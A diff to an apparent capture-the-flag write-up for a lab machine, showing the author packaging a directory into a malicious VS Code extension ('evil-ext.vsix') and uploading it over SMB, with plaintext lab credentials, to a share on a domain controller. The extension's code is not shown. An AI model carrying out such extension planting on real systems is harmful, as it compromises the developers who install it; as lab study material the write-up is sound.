@@ -267,7 +267,36 @@ Ill make a directory called extension, in here ill make the `extension.js` file 
 }
 ```
 
-Ill also make a `packagh`
+Ill also make a `package.json` file in the same dir
+
+```python
+❯❯❯ zip -r evil-ext.vsix extension     
+  adding: extension/ (stored 0%)
+  adding: extension/package.json (deflated 29%)
+  adding: extension/extension.js (deflated 52%)
+```
+
+Then ill just zip the directory containing the two files
+
+```python
+❯❯❯ smbclient //dc01.checkpoint.htb/DevDrop -U 'mark.davies'%'Checkpoint2024!'
+Try "help" to get a list of possible commands.
+smb: \> put evil-ext.vsix 
+putting file evil-ext.vsix as \evil-ext.vsix (30.9 kB/s) (average 30.9 kB/s)
+smb: \> ls
+  .                                   D        0  Thu Oct 29 00:35:54 2026
+  ..                                  D        0  Sat May  9 15:42:27 2026
+  evil-ext.vsix                       A     1390  Thu Oct 29 00:35:54 2026
+
+		10459391 blocks of size 4096. 2466745 blocks available
+smb: \> 
+```
+
+Then ill plant the file
+
+```python
+
+```
 
 
 
